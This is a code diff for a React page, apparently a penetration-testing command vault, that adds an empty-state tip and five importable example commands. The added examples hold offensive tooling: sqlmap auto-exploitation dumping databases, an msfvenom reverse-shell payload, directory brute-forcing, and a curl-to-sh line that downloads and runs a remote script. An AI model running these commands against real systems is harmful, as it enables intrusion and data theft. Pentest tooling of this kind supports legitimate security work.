@@ -385,11 +385,50 @@ export default function CommandsPage() {
               <Loader2 className="animate-spin mr-2" size={18} /> Loading commands...
             </div>
           ) : filteredCommands.length === 0 ? (
-            <div className="flex flex-col items-center justify-center py-16 text-muted-foreground text-xs gap-3">
-              <FileCode size={32} className="opacity-20" />
-              <p>No commands found.</p>
-              <button onClick={() => { resetForm(); setIsFormOpen(true); }} className="px-3 py-1.5 text-xs border border-primary/50 text-primary hover:bg-primary/20 rounded flex items-center gap-1 transition-colors"><Plus size={12} /> Add First Command</button>
-            </div>
+            commands.length === 0 ? (
+              <div className="max-w-2xl mx-auto py-8 space-y-5">
+                <div className="text-center space-y-2">
+                  <FileCode size={32} className="opacity-20 mx-auto" />
+                  <p className="text-sm font-bold text-foreground">No commands saved yet</p>
+                  <p className="text-xs text-muted-foreground">Your personal command vault — save any terminal command and access it instantly with one click.</p>
+                  <button onClick={() => { resetForm(); setIsFormOpen(true); }} className="mt-2 px-4 py-2 text-xs border border-primary/50 text-primary hover:bg-primary/20 rounded flex items-center gap-1 transition-colors mx-auto"><Plus size={12} /> Add First Command</button>
+                </div>
+                <div className="bg-primary/5 border border-primary/20 rounded-lg p-4 space-y-3">
+                  <div className="text-[10px] text-primary tracking-widest uppercase font-bold flex items-center gap-1.5"><Target size={11} /> Tip: Use {'{{'}<span className="text-primary">target</span>{'}}'}  for auto-substitution</div>
+                  <p className="text-xs text-muted-foreground leading-relaxed">Add <code className="bg-black/30 px-1 rounded text-primary">{'{{target}}'}</code> anywhere in a command. Then set a target IP/URL at the top of the page — all commands auto-fill with your target. Great for repeating the same scan against different hosts.</p>
+                </div>
+                <div className="space-y-2">
+                  <div className="text-[10px] text-muted-foreground tracking-widest uppercase">Example commands to get started:</div>
+                  {[
+                    { title: 'Nmap Port Scan', category: 'recon', command: 'nmap -sC -sV -oN scan.txt {{target}}', description: 'Full port scan with service detection and default scripts. Saves output to scan.txt.' },
+                    { title: 'Gobuster Directory Brute', category: 'web', command: 'gobuster dir -u http://{{target}} -w /usr/share/wordlists/dirb/common.txt -o dirs.txt', description: 'Brute force web directories using a common wordlist.' },
+                    { title: 'SQLmap Auto-Exploit', category: 'web', command: "sqlmap -u 'http://{{target}}/login?id=1' --dbs --batch", description: 'Automatically detect and exploit SQL injection, dumping database names.' },
+                    { title: 'MSFvenom Reverse Shell', category: 'exploitation', command: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST={{target}} LPORT=4444 -f elf -o shell.elf', description: 'Generate a Linux reverse shell ELF binary connecting back to your IP.' },
+                    { title: 'LinPEAS Privesc', category: 'post-exploitation', command: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', description: 'Download and run LinPEAS privilege escalation enumeration script.' },
+                  ].map(ex => (
+                    <div key={ex.title} className="bg-card/50 border border-border rounded-lg p-3 flex items-start justify-between gap-3">
+                      <div className="min-w-0 flex-1 space-y-1">
+                        <div className="flex items-center gap-2">
+                          <span className="text-xs font-bold text-foreground">{ex.title}</span>
+                          <span className="text-[9px] px-1.5 py-0.5 border border-border bg-secondary text-muted-foreground rounded uppercase font-bold">{ex.category}</span>
+                        </div>
+                        <pre className="text-[10px] text-primary font-mono bg-black/40 px-2 py-1.5 rounded border border-primary/10 overflow-x-auto">{ex.command}</pre>
+                        <p className="text-[10px] text-muted-foreground">{ex.description}</p>
+                      </div>
+                      <button onClick={() => { setFormData({ title: ex.title, category: ex.category, command: ex.command, description: ex.description }); setIsFormOpen(true); }}
+                        className="shrink-0 text-[10px] text-primary/60 hover:text-primary border border-primary/20 hover:border-primary/50 px-2 py-1 rounded transition-colors">
+                        import
+                      </button>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            ) : (
+              <div className="flex flex-col items-center justify-center py-16 text-muted-foreground text-xs gap-2">
+                <Search size={24} className="opacity-20" />
+                <p>No commands match your search.</p>
+              </div>
+            )
           ) : (
             <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
               {filteredCommands.map(cmd => {
